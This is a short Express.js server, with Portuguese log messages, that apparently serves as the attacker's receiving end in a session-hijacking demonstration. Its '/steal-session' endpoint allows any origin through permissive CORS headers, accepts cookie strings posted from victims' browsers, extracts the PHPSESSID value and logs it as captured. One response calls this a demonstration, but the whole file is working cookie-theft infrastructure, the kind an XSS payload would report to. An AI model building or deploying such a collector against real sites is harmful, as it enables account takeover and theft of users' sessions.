import express from "express";
const app = express();
const port = process.env.PORT || 8080;
app.use(express.json());

app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*"); 
  res.setHeader("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  next();
});

app.options("/steal-session", (req, res) => {
  res.sendStatus(200);
});

app.post("/steal-session", (req, res) => {
  try {
      const {cookies} = req.body;

   
      if (!cookies) {
          console.log("Nenhum cookie recebido.");
          return res.status(400).send("Erro: Nenhum cookie recebido.");
      }

      const splitedCookies = cookies.split(";");
      const phpSessId = splitedCookies.find((cookie) => cookie.includes("PHPSESSID"));

      if (!phpSessId) {
          console.log("PHPSESSID não encontrado.");
          return res.status(400).send("Erro: Nenhuma sessão encontrada.");
      }

      const sessionId = phpSessId.split("=")[1];
      console.log("PHPSESSID capturado:", sessionId);

      res.status(200).send("Sessão capturada com sucesso para demonstração.");
  } catch (error) {
      console.error("Erro ao capturar sessão:", error);
      res.status(500).send("Erro interno no servidor.");
  }
});

app.listen(port, () => {
  console.log("Server is running on port" + " " + port);
});



